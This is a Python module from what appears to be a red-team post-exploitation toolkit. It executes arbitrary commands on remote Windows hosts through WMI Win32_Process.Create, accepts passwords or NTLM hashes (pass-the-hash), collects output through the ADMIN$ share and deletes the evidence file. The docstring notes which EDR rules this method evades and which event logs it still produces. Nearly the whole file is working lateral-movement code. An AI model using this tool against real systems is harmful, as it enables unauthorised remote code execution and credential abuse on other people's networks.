#!/usr/bin/env python3
"""
redshift_toolkit.postex.wmi_exec — WMI-based remote command execution.

Calls Win32_Process.Create over DCOM/RPC. Output is collected by writing
to a file on ADMIN$ that we then read via SMB.

WMI execution often bypasses SMB-only EDR rules (the rules that flag
service creation a la PsExec). It does, however, generate:
- Sysmon Event 1 (process creation) with parent WmiPrvSE.exe
- 4624 logon-type 3
- ScriptBlockLogging if PowerShell is invoked

Usage
-----
  python3 -m redshift_toolkit.postex.wmi_exec \\
      --target 10.0.0.50 --user alice -p 'Password1' \\
      --command 'whoami /priv'

Requires
--------
  pip install impacket

Author: Redshift Project — Module 19
License: MIT
"""

from __future__ import annotations

import argparse
import random
import string
import sys
import time

GREEN = "\033[92m"
RED = "\033[91m"
RESET = "\033[0m"


def parse_hash(s: str) -> tuple[bytes, bytes]:
    if ":" in s:
        lm, nt = s.split(":", 1)
    else:
        lm, nt = "aad3b435b51404eeaad3b435b51404ee", s
    return bytes.fromhex(lm), bytes.fromhex(nt)


def execute(target: str, user: str, password: str | None, lmhash: bytes, nthash: bytes,
            domain: str, command: str, timeout: int) -> str:
    try:
        from impacket.dcerpc.v5.dcomrt import DCOMConnection
        from impacket.dcerpc.v5.dcom.wmi import CLSID_WbemLevel1Login, IID_IWbemLevel1Login, IWbemLevel1Login
        from impacket.smbconnection import SMBConnection
    except ImportError:
        sys.stderr.write("error: pip install impacket\n")
        sys.exit(2)

    out_name = "rs_" + "".join(random.choices(string.ascii_lowercase, k=8)) + ".txt"
    out_path = f"C:\\Windows\\Temp\\{out_name}"
    full_cmd = f'cmd.exe /Q /c {command} 1> {out_path} 2>&1'

    dcom = DCOMConnection(target, user, password or "", domain,
                           lmhash=lmhash.hex() if lmhash else "",
                           nthash=nthash.hex() if nthash else "",
                           oxidResolver=True, doKerberos=False)
    try:
        iInterface = dcom.CoCreateInstanceEx(CLSID_WbemLevel1Login, IID_IWbemLevel1Login)
        iWbemLevel1Login = IWbemLevel1Login(iInterface)
        iWbemServices = iWbemLevel1Login.NTLMLogin("//./root/cimv2", None, None)
        iWbemLevel1Login.RemRelease()

        win32Process, _ = iWbemServices.GetObject("Win32_Process")
        win32Process.Create(full_cmd, "C:\\", None)
    finally:
        try:
            dcom.disconnect()
        except Exception:
            pass

    # Wait for command to complete
    time.sleep(2)

    # Read output via SMB
    try:
        smb = SMBConnection(target, target, sess_port=445, timeout=timeout)
        if password is not None:
            smb.login(user, password, domain=domain)
        else:
            smb.login(user, "", domain=domain,
                      lmhash=lmhash.hex(), nthash=nthash.hex())
        tid = smb.connectTree("ADMIN$")
        fid = smb.openFile(tid, f"\\Temp\\{out_name}")
        data = smb.readFile(tid, fid)
        smb.closeFile(tid, fid)
        try:
            smb.deleteFile("ADMIN$", f"\\Temp\\{out_name}")
        except Exception:
            pass
        smb.logoff()
        return data.decode("utf-8", errors="replace")
    except Exception as e:
        return f"(executed; could not read output file: {e})"


def main():
    p = argparse.ArgumentParser(
        prog="wmi_exec",
        description="WMI-based remote command execution.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    p.add_argument("--target", required=True)
    p.add_argument("--user", required=True)
    p.add_argument("-p", "--password")
    p.add_argument("--hash", help="LM:NT or NT hash")
    p.add_argument("--domain", default="WORKGROUP")
    p.add_argument("--command", required=True)
    p.add_argument("--timeout", type=int, default=20)
    p.add_argument("--no-color", action="store_true")
    args = p.parse_args()

    on = sys.stdout.isatty() and not args.no_color
    if not args.password and not args.hash:
        sys.stderr.write("specify -p or --hash\n")
        sys.exit(2)

    lm = nt = b""
    if args.hash:
        lm, nt = parse_hash(args.hash)

    print(f"{GREEN if on else ''}[+] WMI exec on {args.target}{RESET if on else ''}",
          file=sys.stderr)
    try:
        out = execute(args.target, args.user, args.password, lm, nt,
                      args.domain, args.command, args.timeout)
    except Exception as e:
        print(f"{RED if on else ''}[!] failed: {e}{RESET if on else ''}", file=sys.stderr)
        sys.exit(1)
    print(out, end="")


if __name__ == "__main__":
    main()
